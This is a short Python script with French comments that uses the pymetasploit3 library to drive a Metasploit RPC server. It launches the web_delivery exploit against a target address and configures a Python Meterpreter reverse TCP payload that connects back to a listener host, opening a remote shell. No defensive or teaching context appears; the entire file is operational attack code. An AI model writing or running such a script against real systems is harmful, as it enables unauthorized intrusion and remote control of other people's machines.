from pymetasploit3.msfrpc import MsfRpcClient

# Connexion au client RPC
client = MsfRpcClient('password', server='10.125.26.56', port=55553)

exploit = client.modules.use('exploit', 'multi/script/web_delivery')  # Remplacez 'exploit_name' par le nom réel de l'exploit
exploit['RHOSTS'] = '192.168.1.101'  # IP cible

### Ajouter les options du payload et à l'exploit ---------------
payload = client.modules.use('payload', 'python/meterpreter/reverse_tcp')
payload['LHOST'] = '10.125.26.54' 
payload['LPORT'] = '22'
### Ajouter les options du payload et à l'exploit ---------------

output = exploit.execute(payload=payload)
print(output)
